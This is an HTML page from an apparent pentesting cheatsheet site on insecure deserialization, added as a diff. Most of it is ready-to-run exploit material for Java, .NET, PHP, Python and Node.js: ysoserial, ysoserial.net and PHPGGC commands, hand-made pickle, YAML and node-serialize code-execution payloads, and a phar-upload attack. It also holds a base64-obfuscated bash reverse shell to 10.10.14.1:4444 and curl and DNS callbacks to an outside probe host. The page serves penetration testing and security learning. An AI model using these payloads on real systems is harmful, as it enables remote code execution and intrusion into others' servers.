@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Deserialization | JinPwn</title><meta name="description" content="User-controlled data is fed to a deserializer that doesn&amp;rsquo;t validate types. Most cases lead to RCE via gadget chains in libraries the app already loaded.">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+
+<link rel="canonical" href="https://jinpwn.dev/cheatsheets/web/web14-deserialization/">
+<meta property="og:title" content="Deserialization | JinPwn">
+<meta property="og:description" content="User-controlled data is fed to a deserializer that doesn&amp;rsquo;t validate types. Most cases lead to RCE via gadget chains in libraries the app already loaded.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jinpwn.dev/cheatsheets/web/web14-deserialization/">
+<meta property="og:site_name" content="JinPwn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Deserialization | JinPwn">
+<meta name="twitter:description" content="User-controlled data is fed to a deserializer that doesn&amp;rsquo;t validate types. Most cases lead to RCE via gadget chains in libraries the app already loaded.">
+<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:site" content="@jinpwn">
+<meta name="twitter:creator" content="@jinpwn">
+
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"User-controlled data is fed to a deserializer that doesn\u0026rsquo;t validate types. Most cases lead to RCE via gadget chains in libraries the app already loaded.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"Deserialization | JinPwn","url":"https://jinpwn.dev/cheatsheets/web/web14-deserialization/"}</script>
+
+<meta name="theme-color" content="#111111">
+<link rel="icon" type="image/png" href="/favicon.png">
+
+      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
+
+
+        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
+        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
+
+
+</head>
+<body class="">
+  
+
+
+
+
+
+  
+  
+  
+
+
+
+  
+
+<header class="site-header">
+  <nav class="top-nav">
+    <div class="container nav-inner">
+      <div class="nav-left">
+        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
+        <div class="nav-links desktop-only">
+          
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+        </div>
+      </div>
+      <div class="nav-actions">
+        <div class="search-anchor" id="search-root" data-search-root>
+          <label class="search-trigger" for="search-input">
+            <span class="search-glyph" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <circle cx="11" cy="11" r="7"></circle>
+                <path d="M20 20L16.65 16.65"></path>
+              </svg>
+            </span>
+            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
+            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M18 6L6 18"></path>
+                <path d="M6 6l12 12"></path>
+              </svg>
+            </button>
+            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
+          </label>
+          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
+  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
+  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
+    <p class="search-empty">Type to search posts and cheatsheets.</p>
+  </div>
+</div>
+
+        </div>
+        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="11" cy="11" r="7"></circle>
+            <path d="M20 20L16.65 16.65"></path>
+          </svg>
+        </button>
+        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
+            <path d="M3 6h18"></path>
+            <path d="M3 12h18"></path>
+            <path d="M3 18h18"></path>
+          </svg>
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
+            <path d="M18 6L6 18"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <div id="mobile-nav" class="mobile-nav">
+      
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+    </div>
+  </nav>
+</header>
+
+  
+  <main class="site-main">
+    
+  
+  
+  
+  <article class="container cheatsheet-docs-shell">
+    <div class="cheatsheet-docs-layout">
+      
+        <aside class="cheatsheet-sidebar" aria-label="Web Pentesting navigation">
+    <div class="cheatsheet-sidebar-inner">
+      
+        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
+      
+      <a href="/cheatsheets/web/" class="cheatsheet-sidebar-section">Web Pentesting</a>
+      
+        <nav class="cheatsheet-sidebar-nav">
+          <ul class="cheatsheet-sidebar-list">
+            
+              <li>
+                <a href="/cheatsheets/web/00-web-moc/" class="cheatsheet-sidebar-link">Web MOC</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web01-content-discovery/" class="cheatsheet-sidebar-link">Content Discovery</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web02-auth--session/" class="cheatsheet-sidebar-link">Auth &amp; Session</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web03-sql-injection/" class="cheatsheet-sidebar-link">SQL Injection</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web04-nosql-injection/" class="cheatsheet-sidebar-link">NoSQL Injection</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web05-command-injection/" class="cheatsheet-sidebar-link">Command Injection</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web06-ssti/" class="cheatsheet-sidebar-link">SSTI</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web08-xss/" class="cheatsheet-sidebar-link">XSS</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web07-xxe/" class="cheatsheet-sidebar-link">XXE</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web09-csrf--cors/" class="cheatsheet-sidebar-link">WEB09 CSRF &amp; CORS</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web10-request-smuggling/" class="cheatsheet-sidebar-link">Request Smuggling</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web11-web-cache-poisoning/" class="cheatsheet-sidebar-link">Web Cache Poisoning</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web12-ssrf/" class="cheatsheet-sidebar-link">SSRF</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web13-file-upload--lfi/" class="cheatsheet-sidebar-link">File Upload &amp; LFI</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web14-deserialization/" class="cheatsheet-sidebar-link is-current">Deserialization</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web15-prototype-pollution/" class="cheatsheet-sidebar-link">WEB15 Prototype Pollution</a>
+              </li>
+            
+          </ul>
+        </nav>
+      
+    </div>
+  </aside>
+      
+      <div class="cheatsheet-docs-main cheatsheet-page-main">
+        <header class="cheatsheet-page-header">
+          <h1>Deserialization</h1>
+          
+        </header>
+
+        
+          <details class="cheatsheet-mobile-sections">
+    <summary class="cheatsheet-mobile-sections-summary">
+      <span class="cheatsheet-mobile-sections-label">Sections</span>
+      <span class="cheatsheet-mobile-sections-current">Deserialization</span>
+      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
+    </summary>
+    <div class="cheatsheet-mobile-sections-panel">
+      <nav aria-label="Web Pentesting sections">
+        <ul class="cheatsheet-mobile-sections-list">
+          
+            <li>
+              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
+            </li>
+          
+          <li>
+            <a href="/cheatsheets/web/" class="cheatsheet-mobile-sections-link">Overview</a>
+          </li>
+          
+            <li>
+              <a href="/cheatsheets/web/00-web-moc/" class="cheatsheet-mobile-sections-link">Web MOC</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web01-content-discovery/" class="cheatsheet-mobile-sections-link">Content Discovery</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web02-auth--session/" class="cheatsheet-mobile-sections-link">Auth &amp; Session</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web03-sql-injection/" class="cheatsheet-mobile-sections-link">SQL Injection</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web04-nosql-injection/" class="cheatsheet-mobile-sections-link">NoSQL Injection</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web05-command-injection/" class="cheatsheet-mobile-sections-link">Command Injection</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web06-ssti/" class="cheatsheet-mobile-sections-link">SSTI</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web08-xss/" class="cheatsheet-mobile-sections-link">XSS</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web07-xxe/" class="cheatsheet-mobile-sections-link">XXE</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web09-csrf--cors/" class="cheatsheet-mobile-sections-link">WEB09 CSRF &amp; CORS</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web10-request-smuggling/" class="cheatsheet-mobile-sections-link">Request Smuggling</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web11-web-cache-poisoning/" class="cheatsheet-mobile-sections-link">Web Cache Poisoning</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web12-ssrf/" class="cheatsheet-mobile-sections-link">SSRF</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web13-file-upload--lfi/" class="cheatsheet-mobile-sections-link">File Upload &amp; LFI</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web14-deserialization/" class="cheatsheet-mobile-sections-link is-current">Deserialization</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web15-prototype-pollution/" class="cheatsheet-mobile-sections-link">WEB15 Prototype Pollution</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </details>
+        
+
+        <div class="markdown-content cheatsheet-page-body">
+          <p>User-controlled data is fed to a deserializer that doesn&rsquo;t validate types. Most cases lead to RCE via gadget chains in libraries the app already loaded.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">T</span><span class="o">=</span>https://target.com
+</span></span></code></pre></div><h2 id="i-where-it-lives" data-heading-permalink="true"><span class="heading-content">i. Where it lives</span>
+    <a class="heading-permalink" href="#i-where-it-lives" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Anywhere serialized objects cross the trust boundary:</p>
+<ul>
+<li>Cookies (sometimes base64-serialized session blobs)</li>
+<li>HTTP request bodies (especially API endpoints)</li>
+<li>Hidden form fields</li>
+<li>HTTP headers (rare but happens)</li>
+<li>Queue messages (RabbitMQ, ActiveMQ, etc) consumed by the web app</li>
+<li>File uploads that get parsed (phar, pickle, marshalled data)</li>
+<li>Cache contents (memcached, Redis) when the app deserializes</li>
+<li>WebSocket messages</li>
+</ul>
+<p>Detect by looking for telltale magic bytes / patterns in any base64 or binary blob you see:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Pattern</th>
+          <th>Language</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>rO0AB</code> (base64 of <code>\xac\xed\x00\x05</code>)</td>
+          <td>Java</td>
+      </tr>
+      <tr>
+          <td><code>\xac\xed\x00\x05</code> raw</td>
+          <td>Java</td>
+      </tr>
+      <tr>
+          <td><code>AAEAAAD/////</code> (base64 of <code>\x00\x01\x00\x00\x00\xff...</code>)</td>
+          <td>.NET (BinaryFormatter)</td>
+      </tr>
+      <tr>
+          <td><code>&lt;?xml ... &lt;a1:...&gt;</code></td>
+          <td>.NET (XML / SoapFormatter)</td>
+      </tr>
+      <tr>
+          <td><code>O:N:&quot;&lt;class&gt;&quot;</code></td>
+          <td>PHP serialize()</td>
+      </tr>
+      <tr>
+          <td><code>a:N:{...}</code></td>
+          <td>PHP serialize() (array)</td>
+      </tr>
+      <tr>
+          <td><code>\x80\x04</code> (pickle protocol 4 header) or <code>(dp0</code></td>
+          <td>Python pickle</td>
+      </tr>
+      <tr>
+          <td><code>&lt;?yaml</code> / <code>---</code> / <code>!!python/object</code></td>
+          <td>Python YAML (unsafe load)</td>
+      </tr>
+      <tr>
+          <td><code>\x04\x08</code></td>
+          <td>Ruby Marshal</td>
+      </tr>
+      <tr>
+          <td><code>_$$ND_FUNC$$_</code> or starts with <code>{&quot;rce&quot;:&quot;</code> patterns</td>
+          <td>Node.js (node-serialize)</td>
+      </tr>
+  </tbody>
+</table>
+<p>Spot any of these in user-controllable input → deserialization candidate.</p>
+<h2 id="ii-tools-the-one-liner-per-language" data-heading-permalink="true"><span class="heading-content">ii. Tools, the one-liner per language</span>
+    <a class="heading-permalink" href="#ii-tools-the-one-liner-per-language" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="java-ysoserial" data-heading-permalink="true"><span class="heading-content">Java: ysoserial</span>
+    <a class="heading-permalink" href="#java-ysoserial" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Generates serialized payloads using known gadget chains from common Java libraries:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">java -jar ysoserial.jar
+</span></span><span class="line"><span class="cl"><span class="c1">## Lists all available payloads</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Generate a payload:</span>
+</span></span><span class="line"><span class="cl">java -jar ysoserial.jar CommonsCollections5 <span class="s1">&#39;nslookup attacker.oast.live&#39;</span> &gt; payload.bin
+</span></span><span class="line"><span class="cl">java -jar ysoserial.jar CommonsCollections6 <span class="s1">&#39;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}&#39;</span> &gt; rev.bin
+</span></span><span class="line"><span class="cl"><span class="c1">## Most common useful chains:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## CommonsCollections5, CommonsCollections6 (modern Java)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## CommonsCollections1 (older Java)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Spring1, Spring2 (Spring framework)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Hibernate1</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Groovy1</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## URLDNS (test-only, just DNS lookup, useful for blind detection)</span>
+</span></span></code></pre></div><p>Use URLDNS first to confirm deserialization without triggering RCE:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">java -jar ysoserial.jar URLDNS <span class="s2">&#34;http://attacker.oast.live/&#34;</span> &gt; probe.bin
+</span></span><span class="line"><span class="cl"><span class="c1">## Submit probe.bin to the target. If OAST gets a DNS hit → vuln confirmed.</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Then escalate to a real chain.</span>
+</span></span></code></pre></div><p>When delivered via web (URL/cookie/header):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">base64 -w0 payload.bin    <span class="c1">## URL-safe wrapping for cookies/URLs</span>
+</span></span></code></pre></div><h3 id="net-ysoserialnet" data-heading-permalink="true"><span class="heading-content">.NET: ysoserial.net</span>
+    <a class="heading-permalink" href="#net-ysoserialnet" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Same idea for .NET:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c <span class="s2">&#34;calc.exe&#34;</span>
+</span></span><span class="line"><span class="cl">ysoserial.exe -f Json.Net -g ObjectDataProvider -c <span class="s2">&#34;cmd /c calc.exe&#34;</span>
+</span></span><span class="line"><span class="cl">ysoserial.exe -f SoapFormatter -g WindowsIdentity -c <span class="s2">&#34;cmd /c calc.exe&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## List all:</span>
+</span></span><span class="line"><span class="cl">ysoserial.exe --fullhelp
+</span></span></code></pre></div><p>Common formatters in .NET deserialization:</p>
+<ul>
+<li>BinaryFormatter (most common, deprecated by Microsoft)</li>
+<li>LosFormatter (used in ViewState)</li>
+<li>ObjectStateFormatter</li>
+<li>Json.Net (TypeNameHandling != None)</li>
+<li>DataContractSerializer (with KnownTypes)</li>
+<li>NetDataContractSerializer</li>
+<li>XamlReader</li>
+<li>XmlSerializer</li>
+</ul>
+<p>For ASP.NET ViewState specifically: ysoserial.net with <code>LosFormatter</code> gadget if the machine key is leaked.</p>
+<h3 id="php-phpggc" data-heading-permalink="true"><span class="heading-content">PHP: PHPGGC</span>
+    <a class="heading-permalink" href="#php-phpggc" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">phpggc -l                              <span class="c1">## list available chains</span>
+</span></span><span class="line"><span class="cl">phpggc Monolog/RCE1 <span class="s1">&#39;system&#39;</span> <span class="s1">&#39;id&#39;</span> -b   <span class="c1">## base64-encoded chain via Monolog gadget</span>
+</span></span><span class="line"><span class="cl">phpggc Laravel/RCE1 system id          <span class="c1">## Laravel-specific chain</span>
+</span></span><span class="line"><span class="cl">phpggc Symfony/RCE4 system id          <span class="c1">## Symfony</span>
+</span></span><span class="line"><span class="cl">phpggc -p phar -f symfony/rce4 system id -o exploit.phar    <span class="c1">## phar package</span>
+</span></span></code></pre></div><p>Common chains:</p>
+<ul>
+<li>Monolog/RCE1-9 (every modern PHP app has Monolog logging)</li>
+<li>Laravel/RCE-<em>, Symfony/RCE-</em>, Drupal/RCE-*</li>
+<li>WordPress/RCE-*</li>
+<li>Guzzle/RCE-*</li>
+<li>Slim/RCE-*</li>
+<li>ZendFramework/RCE-*</li>
+</ul>
+<p>When the target&rsquo;s PHP version + composer.json suggests a library, find the matching gadget.</p>
+<h3 id="python-pickle" data-heading-permalink="true"><span class="heading-content">Python: pickle</span>
+    <a class="heading-permalink" href="#python-pickle" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Pickle is trivially exploitable when used on user input. No tool needed, just craft:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s2">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">import pickle, os, base64
+</span></span></span><span class="line"><span class="cl"><span class="s2">class X:
+</span></span></span><span class="line"><span class="cl"><span class="s2">    def __reduce__(self):
+</span></span></span><span class="line"><span class="cl"><span class="s2">        return (os.system, (&#39;id&#39;,))
+</span></span></span><span class="line"><span class="cl"><span class="s2">print(base64.b64encode(pickle.dumps(X())).decode())
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span>
+</span></span></code></pre></div><p>Output is a base64 string. Decode → unsafe <code>pickle.loads()</code> runs <code>os.system('id')</code>.</p>
+<p>For Python YAML, use <code>yaml.unsafe_load</code> payloads:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">yaml</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;!!python/object/apply:os.system [&#34;id&#34;]&#34;&#34;&#34;</span>
+</span></span></code></pre></div><h3 id="ruby-marshal" data-heading-permalink="true"><span class="heading-content">Ruby Marshal</span>
+    <a class="heading-permalink" href="#ruby-marshal" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Less commonly tooled. Use universal RCE chain by hand or with <a href="https://github.com/GitHubAssessments/CVE_Assessments_05_2020/blob/master/Universal-Ruby-Deserialization-Gadget.md" target="_blank" rel="noopener noreferrer">universal_rce_gadgets_for_ruby</a>
+:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="c1"># Crafted Marshal payload for Rails apps:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># (See PayloadsAllTheThings - Ruby deserialization)</span>
+</span></span></code></pre></div><h3 id="nodejs-node-serialize" data-heading-permalink="true"><span class="heading-content">Node.js: node-serialize</span>
+    <a class="heading-permalink" href="#nodejs-node-serialize" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>The <code>node-serialize</code> library deserializes arbitrary JS, including function literals. Trivially exploitable:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;rce&#34;</span><span class="o">:</span><span class="s2">&#34;_$$ND_FUNC$$_function(){require(&#39;child_process&#39;).exec(&#39;id&#39;,function(error,stdout,stderr){console.log(stdout)})}()&#34;</span><span class="p">}</span>
+</span></span></code></pre></div><p>Other Node.js deserialization libraries vary. <code>serialize-javascript</code> is safer by default.</p>
+<h2 id="iii-the-blind-probe-always-start-here" data-heading-permalink="true"><span class="heading-content">iii. The blind probe (always start here)</span>
+    <a class="heading-permalink" href="#iii-the-blind-probe-always-start-here" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Before launching RCE chains:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Java URLDNS:</span>
+</span></span><span class="line"><span class="cl">java -jar ysoserial.jar URLDNS <span class="s2">&#34;http://abc.oast.live/&#34;</span> &gt; probe.bin
+</span></span><span class="line"><span class="cl"><span class="c1">## .NET TypeConfuseDelegate with ping:</span>
+</span></span><span class="line"><span class="cl">ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c <span class="s2">&#34;ping abc.oast.live&#34;</span> &gt; probe.bin
+</span></span><span class="line"><span class="cl"><span class="c1">## PHP via Monolog with curl:</span>
+</span></span><span class="line"><span class="cl">phpggc Monolog/RCE6 system <span class="s1">&#39;curl abc.oast.live&#39;</span> -b
+</span></span><span class="line"><span class="cl"><span class="c1">## Python pickle with os.system curl:</span>
+</span></span><span class="line"><span class="cl">python3 -c <span class="s2">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">import pickle, base64
+</span></span></span><span class="line"><span class="cl"><span class="s2">class X:
+</span></span></span><span class="line"><span class="cl"><span class="s2">    def __reduce__(self):
+</span></span></span><span class="line"><span class="cl"><span class="s2">        return (__import__(&#39;os&#39;).system, (&#39;curl abc.oast.live&#39;,))
+</span></span></span><span class="line"><span class="cl"><span class="s2">print(base64.b64encode(pickle.dumps(X())).decode())
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span>
+</span></span></code></pre></div><p>Send the probe to the suspected sink. Wait for the OAST hit. Vuln confirmed → escalate to RCE.</p>
+<h2 id="iv-finding-the-right-gadget-chain" data-heading-permalink="true"><span class="heading-content">iv. Finding the right gadget chain</span>
+    <a class="heading-permalink" href="#iv-finding-the-right-gadget-chain" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Each language has many possible chains. The chain that works depends on which libraries are loaded in the target process.</p>
+<h3 id="java" data-heading-permalink="true"><span class="heading-content">Java</span>
+    <a class="heading-permalink" href="#java" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Look at the response headers and visible framework signs to identify the stack:</p>
+<ul>
+<li><code>X-Powered-By: Servlet/3.1</code>, <code>Server: Apache Tomcat/X.X</code></li>
+<li><code>Set-Cookie: JSESSIONID=...</code></li>
+<li>Spring error pages</li>
+<li>Confluence / Jira fingerprints</li>
+</ul>
+<p>Common library matrix:</p>
+<ul>
+<li>Tomcat + Spring → try Spring1, Spring2, CommonsBeanutils1</li>
+<li>Confluence → Confluence-specific chains</li>
+<li>Jenkins → Jenkins chains</li>
+<li>Plain JDK (no extra libs) → URLDNS only (test-only)</li>
+</ul>
+<p>When you have source code access, look at <code>pom.xml</code> / <code>build.gradle</code> for libraries that have known gadget chains.</p>
+<h3 id="net" data-heading-permalink="true"><span class="heading-content">.NET</span>
+    <a class="heading-permalink" href="#net" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Identify the formatter from the data shape:</p>
+<ul>
+<li><code>AAEAAAD/////</code> → BinaryFormatter</li>
+<li><code>__EVENTVALIDATION</code> / <code>__VIEWSTATE</code> → ViewState (LosFormatter/ObjectStateFormatter)</li>
+<li>JSON with <code>$type</code> → Json.Net with TypeNameHandling</li>
+<li>XAML → XamlReader</li>
+</ul>
+<p>ViewState RCE specifically (requires machine key):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ysoserial.exe -p ViewState -g TextFormattingRunProperties <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --validationalg<span class="o">=</span><span class="s2">&#34;SHA1&#34;</span> --validationkey<span class="o">=</span><span class="s2">&#34;&lt;KEY_FROM_WEB_CONFIG&gt;&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -c <span class="s2">&#34;cmd /c calc.exe&#34;</span>
+</span></span></code></pre></div><h3 id="php" data-heading-permalink="true"><span class="heading-content">PHP</span>
+    <a class="heading-permalink" href="#php" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Identify the framework via response headers, error pages, public asset paths:</p>
+<ul>
+<li>Laravel: <code>X-Powered-By: PHP/...</code>, <code>laravel_session</code> cookie, <code>/storage/</code> paths</li>
+<li>Symfony: <code>_sf_*</code> cookies, profile bar in dev, Whoops error pages</li>
+<li>WordPress: <code>/wp-content/</code>, <code>/wp-json/</code>, <code>wp_</code> cookie prefix</li>
+<li>Drupal: <code>Drupal-</code>, <code>/sites/default/</code>, X-Generator header</li>
+<li>Generic: Monolog often present in any modern PHP app, so Monolog chains are first-try</li>
+</ul>
+<h3 id="python" data-heading-permalink="true"><span class="heading-content">Python</span>
+    <a class="heading-permalink" href="#python" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Look for the framework:</p>
+<ul>
+<li>Flask: <code>Werkzeug</code> in error pages, <code>session=eyJ...</code> (signed cookies - see [[WEB02 Auth &amp; Session]])</li>
+<li>Django: <code>csrftoken</code> cookie, <code>sessionid</code>, Django admin URL</li>
+<li>FastAPI: openapi.json, redoc UI</li>
+</ul>
+<p>Pickle is the universal Python attack - always try if you see base64-pickle data.</p>
+<h2 id="v-phar-deserialization-php-specific" data-heading-permalink="true"><span class="heading-content">v. Phar deserialization (PHP-specific)</span>
+    <a class="heading-permalink" href="#v-phar-deserialization-php-specific" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Phar files are PHP archives with embedded metadata. When PHP file functions are called on a phar:// stream URL, the metadata is automatically deserialized. This means LFI + phar upload = deserialization without ever calling <code>unserialize()</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">phpggc -p phar -f Laravel/RCE1 system <span class="s1">&#39;id&#39;</span> -o exploit.phar
+</span></span><span class="line"><span class="cl"><span class="c1">## Upload exploit.phar as any file extension (the magic bytes matter, not extension)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Trigger via LFI/file-handling function:</span>
+</span></span><span class="line"><span class="cl">?file<span class="o">=</span>phar:///tmp/uploads/exploit.phar
+</span></span></code></pre></div><p>File operations that trigger phar deserialization (no <code>unserialize()</code> needed):</p>
+<ul>
+<li><code>file_exists()</code>, <code>is_file()</code>, <code>file_get_contents()</code>, <code>fopen()</code></li>
+<li><code>file()</code>, <code>filesize()</code>, <code>stat()</code>, <code>lstat()</code></li>
+<li><code>getimagesize()</code>, <code>exif_read_data()</code></li>
+<li><code>md5_file()</code>, <code>sha1_file()</code></li>
+</ul>
